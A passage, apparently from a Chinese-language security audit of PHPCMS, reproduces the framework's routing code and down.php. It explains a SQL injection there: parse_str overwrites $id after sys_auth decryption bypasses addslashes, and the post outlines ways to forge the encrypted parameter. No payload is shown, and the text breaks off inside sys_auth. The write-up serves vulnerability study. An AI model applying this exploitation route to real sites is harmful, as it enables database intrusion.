</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">new_addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_GET</span> <span class="o">=</span> <span class="nx">new_addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nx">new_addslashes</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_COOKIE</span> <span class="o">=</span> <span class="nx">new_addslashes</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;route&#39;</span><span class="p">,</span> <span class="nx">SITE_URL</span><span class="p">)</span> <span class="o">?</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;route&#39;</span><span class="p">,</span> <span class="nx">SITE_URL</span><span class="p">)</span> <span class="o">:</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;route&#39;</span><span class="p">,</span> <span class="s1">&#39;default&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;POST&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;POST&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$_key</span> <span class="o">=&gt;</span> <span class="nv">$_value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$_key</span><span class="p">]))</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$_key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;GET&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">route_config</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;GET&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$_key</span> <span class="o">=&gt;</span> <span class="nv">$_value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$_key</span><span class="p">]))</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$_key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">max</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">],</span> <span class="mi">1000000000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 加载配置文件
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $file 配置文件
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $key  要获取的配置荐
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $default  默认配置。当获取配置项目失败时该值发生作用。
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param boolean $reload 强制重新加载。
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">load_config</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$reload</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$configs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$reload</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">][</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">][</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">CACHE_PATH</span> <span class="o">.</span> <span class="s1">&#39;configs&#39;</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">]</span> <span class="o">=</span> <span class="k">include</span> <span class="nv">$path</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">][</span><span class="nv">$key</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$configs</span><span class="p">[</span><span class="nv">$file</span><span class="p">][</span><span class="nv">$key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>
<p>对<code>$_GET,$_POST,$_REQUEST,$_COOKIE</code>进行<code>addslashes</code></p>
</li>
<li>
<p>加载<code>caches/configs/route.php</code>,其为路由配置文件</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 路由配置文件
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 默认配置为default如下：
</span></span></span><span class="line"><span class="cl"><span class="sd"> * &#39;default&#39;=&gt;array(
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 	&#39;m&#39;=&gt;&#39;phpcms&#39;, 
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 	&#39;c&#39;=&gt;&#39;index&#39;, 
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 	&#39;a&#39;=&gt;&#39;init&#39;, 
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 	&#39;data&#39;=&gt;array(
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 		&#39;POST&#39;=&gt;array(
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 			&#39;catid&#39;=&gt;1
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 		),
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 		&#39;GET&#39;=&gt;array(
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 			&#39;contentid&#39;=&gt;1
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 		)
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 	)
</span></span></span><span class="line"><span class="cl"><span class="sd"> * )
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 基中“m”为模型,“c”为控制器，“a”为事件，“data”为其他附加参数。
</span></span></span><span class="line"><span class="cl"><span class="sd"> * data为一个二维数组，可设置POST和GET的默认参数。POST和GET分别对应PHP中的$_POST和$_GET两个超全局变量。在程序中您可以使用$_POST[&#39;catid&#39;]来得到data下面POST中的数组的值。
</span></span></span><span class="line"><span class="cl"><span class="sd"> * data中的所设置的参数等级比较低。如果外部程序有提交相同的名字的变量，将会覆盖配置文件中所设置的值。如：
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 外部程序POST了一个变量catid=2那么你在程序中使用$_POST取到的值是2，而不是配置文件中所设置的1。
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">	<span class="s1">&#39;default&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;init&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>路由方法解析</p>
<ul>
<li>
<p>m为模型即指向<code>phpcms/modules/$m</code></p>
</li>
<li>
<p>c为控制器即指向<code>phpcms/modules/$m/$c.php</code>,同时类名与文件名相同</p>
</li>
<li>
<p>a为事件即指向<code>phpcms/modules/$m/$c.php</code>中的<code>$c</code>类中的<code>$a</code>函数</p>
</li>
</ul>
<p>默认路由为<code>phpcms/modules/content/index.php</code>的<code>index</code>类的<code>init</code>函数</p>
<p>确认路由后,回到<code>application</code>类中,通过<code>load_controller</code>加载路由(include并实例化),然后通过<code>call_user_func</code>对事件函数进行调用</p>
<h2 id="phpcmsmodulescontentdownphp存在sql注入漏洞">phpcms/modules/content/down.php存在SQL注入漏洞</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">down</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$db</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span> <span class="o">=</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_model</span><span class="p">(</span><span class="s1">&#39;content_model&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a_k</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a_k&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$a_k</span><span class="p">))</span> <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a_k</span> <span class="o">=</span> <span class="nx">sys_auth</span><span class="p">(</span><span class="nv">$a_k</span><span class="p">,</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">,</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;auth_key&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a_k</span><span class="p">))</span> <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span> <span class="nv">$m</span><span class="p">,</span> <span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$a_k</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$i</span><span class="p">))</span> <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$id</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span> <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$modelid</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$catid</span><span class="p">))</span> <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="nx">showmessage</span><span class="p">(</span><span class="nx">L</span><span class="p">(</span><span class="s1">&#39;url_invalid&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$allow_visitor</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$MODEL</span> <span class="o">=</span> <span class="nx">getcache</span><span class="p">(</span><span class="s1">&#39;model&#39;</span><span class="p">,</span> <span class="s1">&#39;commons&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tablename</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">table_name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">db_tablepre</span> <span class="o">.</span> <span class="nv">$MODEL</span><span class="p">[</span><span class="nv">$modelid</span><span class="p">][</span><span class="s1">&#39;tablename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">table_name</span> <span class="o">=</span> <span class="nv">$tablename</span> <span class="o">.</span> <span class="s1">&#39;_data&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$rs</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">get_one</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="nv">$id</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$siteids</span> <span class="o">=</span> <span class="nx">getcache</span><span class="p">(</span><span class="s1">&#39;category_content&#39;</span><span class="p">,</span> <span class="s1">&#39;commons&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$siteid</span> <span class="o">=</span> <span class="nv">$siteids</span><span class="p">[</span><span class="nv">$catid</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$CATEGORYS</span> <span class="o">=</span> <span class="nx">getcache</span><span class="p">(</span><span class="s1">&#39;category_content_&#39;</span> <span class="o">.</span> <span class="nv">$siteid</span><span class="p">,</span> <span class="s1">&#39;commons&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system', 'auth_key'));</code>说明<code>$a_k</code>来源于某个字符串的解密结果,因此可以绕过<code>new_addslashes</code></p>
<p>注意到<code>parse_str($a_k);</code>存在变量覆盖漏洞,利用该漏洞绕过<code>if (isset($i)) $i = $id = intval($i);</code>并且覆盖<code>$id</code>即可利用<code>$rs = $this-&gt;db-&gt;get_one(array('id' =&gt; $id));</code>进行sql注入</p>
<p>但是要想利用<code>sys_auth</code>解密字符串就必须先构造出一个能够正常解密且包含注入语句的字符串,有两种途径</p>
<ol>
<li>
<p>获取<code>pc_base::load_config('system', 'auth_key')</code>,<code>auth_key</code>是cms安装时随机生成的,获取难度较大</p>
</li>
<li>
<p>像前面审计dedecms那样,将包含注入语句的字符串传递给cms再通过类似<code>GetCookie</code>的手段将其读取</p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">sys_auth</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$operation</span> <span class="o">=</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">,</span> <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ckey_length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span> <span class="o">?</span> <span class="nv">$key</span> <span class="o">:</span> <span class="nx">pc_base</span><span class="o">::</span><span class="na">load_config</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;auth_key&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keya</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keyb</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keyc</span> <span class="o">=</span> <span class="nv">$ckey_length</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">)</span> <span class="o">:</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">microtime</span><span class="p">()),</span> <span class="o">-</span><span class="nv">$ckey_length</span><span class="p">))</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$cryptkey</span> <span class="o">=</span> <span class="nv">$keya</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$keya</span> <span class="o">.</span> <span class="nv">$keyc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$cryptkey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$string</span> <span class="o">=</span> <span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span> <span class="o">?</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">strtr</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$string</span><span class="p">,</span> <span class="nv">$ckey_length</span><span class="p">),</span> <span class="s1">&#39;-_&#39;</span><span class="p">,</span> <span class="s1">&#39;+/&#39;</span><span class="p">))</span> <span class="o">:</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;%010d&#39;</span><span class="p">,</span> <span class="nv">$expiry</span> <span class="o">?</span> <span class="nv">$expiry</span> <span class="o">+</span> <span class="nx">time</span><span class="p">()</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$string</span> <span class="o">.</span> <span class="nv">$keyb</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$string_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$box</span> <span class="o">=</span> <span class="nx">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">.../*</span><span class="nx">盒变换</span><span class="o">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$operation</span> <span class="o">==</span> <span class="s1">&#39;DECODE&#39;</span><span class="p">)</span> <span class="p">{</span>
